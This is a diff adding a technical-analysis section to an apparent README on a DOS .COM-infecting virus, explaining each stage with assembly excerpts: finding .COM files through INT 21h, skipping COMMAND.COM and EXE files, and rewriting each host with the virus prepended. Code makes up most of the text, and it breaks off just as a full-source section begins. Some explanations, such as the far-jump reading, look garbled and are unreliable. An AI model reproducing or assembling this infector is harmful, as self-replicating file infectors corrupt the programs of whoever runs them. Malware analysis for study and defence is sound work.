@@ -19,6 +19,265 @@ https://www.virustotal.com/gui/file/c17dc774329fda62b91c2d30034836d5d864540cff12
 
 ## Technical Analysis
 
+## 📌 Infection Marker and Entry Point
+
+```asm
+kkk:
+    nop             ; Infection marker: 0x90 0x90
+    nop
+```
+
+The virus uses two `NOP` instructions (`0x90`) as a marker to detect if a file is already infected.
+
+---
+
+## 💾 Saving Command-Line Arguments
+
+```asm
+mov     cx,80h
+mov     si,0080h
+mov     di,0ff7fh
+rep     movsb
+```
+
+This copies the command-line arguments (stored at `PSP:80h`) into a safe area at `0FF7Fh`, preserving them for later restoration.
+
+---
+
+## 📏 Calculating Virus Size
+
+```asm
+lea     ax,begp
+mov     cx,ax
+sub     ax,100h
+mov     ds:[0fah],ax
+```
+
+- `begp` marks the end of the virus.
+- The virus size = `begp - 100h` (entry point of a .COM file).
+- Stored at `DS:0FAh`.
+
+---
+
+## 🧰 Buffer Setup
+
+```asm
+add     cx,fso
+mov     ds:[0f8h],cx
+add     cx,ax
+mov     ds:[0f6h],cx
+```
+
+Creates two memory buffers:
+- **Write buffer** at `[0F8h]`
+- **Read buffer** at `[0F6h]`
+
+`fso` is an offset used to separate buffers and avoid overlap.
+
+---
+
+## 🧬 Copying Virus to Buffer
+
+```asm
+mov     cx,ax
+lea     si,kkk
+mov     di,ds:[0f8h]
+rep     movsb
+```
+
+Copies the virus into the buffer stored at `[0F8h]` so it can be prepended to infected files.
+
+---
+
+## 🔍 Searching for `.COM` Files
+
+```asm
+lea     dx,fff
+mov     ah,4Eh
+mov     cx,20H
+int     21h
+```
+
+- Searches for the first `.COM` file using DOS interrupt 21h.
+- Uses the search pattern stored at `fff`: `*?.com`.
+
+---
+
+## 📂 Accessing DTA and Filename
+
+```asm
+mov     ah,2Fh
+int     21h
+
+mov     ax,es:[bx+1ah]
+mov     ds:[0fch],ax
+
+add     bx,1eh
+mov     ds:[0feh],bx
+```
+
+- Gets the DTA (Disk Transfer Area) to extract:
+  - File size → `[DTA + 1Ah]`
+  - File name → `[DTA + 1Eh]`
+
+---
+
+## 🚫 Skipping Protected Files
+
+```asm
+mov     ax,'OC'
+sub     ax,ds:[009eh]
+je      fin
+```
+
+Skips files starting with `"CO"` (like `COMMAND.COM`) to avoid corrupting critical system files.
+
+---
+
+## 🔐 Memory Limit Check
+
+```asm
+add     ax,180h
+add     ax,ds:[0fah]
+add     ax,fso
+cmp     ax,0fff0h
+ja      fin
+```
+
+Ensures that the total size of the infected file stays within DOS memory limits (< 64KB).
+
+---
+
+## 📖 Opening and Reading File
+
+```asm
+mov     ax,3d02h
+int     21h
+
+mov     bx,ax
+mov     ah,3fh
+mov     cx,ds:[0fch]
+mov     dx,ds:[0f6h]
+int     21h
+```
+
+- Opens the file with read/write access.
+- Reads the entire file into the read buffer.
+
+---
+
+## 🛡 Checking for Infection or EXE Format
+
+```asm
+mov     ax,[bx]
+sub     ax,9090h
+jz      fin
+
+mov     al,'M'
+repne   scasb
+cmp     es:[di],'Z'
+je      fin
+```
+
+- If the file starts with `0x9090`, it’s already infected.
+- If it contains `MZ`, it’s an EXE file, so skip it.
+
+---
+
+## 💾 Creating and Writing Infected File
+
+```asm
+mov     ah,3ch
+mov     dx,ds:[0feh]
+int     21h
+
+mov     bx,ax
+mov     ah,40h
+mov     cx,ds:[0fch]
+add     cx,ds:[0fah]
+mov     dx,ds:[0f8h]
+int     21h
+```
+
+- Creates a new file with the same name (overwrite).
+- Writes: `[virus][original_file]`
+
+---
+
+## 📁 Looping Through Files
+
+```asm
+mov     ah,4fh
+int     21h
+jz      LLL
+```
+
+Uses DOS `Find Next File` to continue processing other `.COM` files.
+
+---
+
+## 🧽 Restoring Command-Line Arguments
+
+```asm
+mov     cx,80h
+mov     si,0ff7fh
+mov     di,0080h
+rep     movsb
+```
+
+Restores the original command-line arguments to ensure that the host behaves as expected.
+
+---
+
+## 🧷 Injecting JMP FAR at Top of Memory
+
+```asm
+mov     ax,0A4F3H
+mov     ds:[0fff9h],ax
+mov     al,0eah
+mov     ds:[0fffbh],al
+mov     ax,100h
+mov     ds:[0fffch],ax
+```
+
+Places a `JMP FAR 100h:A4F3h` at the top of memory (`0FFFBh`). This could be used for re-invocation or persistence.
+
+---
+
+## 🏁 Clean Exit
+
+```asm
+begp:
+mov     ax,4C00h
+int     21h
+```
+
+---
+
+## 📎 Data Section
+
+```asm
+fff     db  '*?.com',0    ; File search mask
+fso     dw  0005h         ; File space offset
+```
+
+Search pattern and padding constant.
+
+---
+
+## 🧠 Summary
+
+| Component         | Purpose                                               |
+|------------------|-------------------------------------------------------|
+| `NOP NOP`        | Infection marker                                      |
+| Buffering        | Safe manipulation of host file + virus                |
+| DTA access       | Extract filename and size                             |
+| EXE detection    | Avoids MZ-format files                                |
+| Size validation  | Prevents memory overflow                              |
+| File I/O         | Read original file, write infected copy               |
+| Restoration      | Keeps host command-line intact                        |
+| JMP injection    | Possible persistence technique                        |
+
 ### Full Source Code with Inline Comments
 
 ```asm
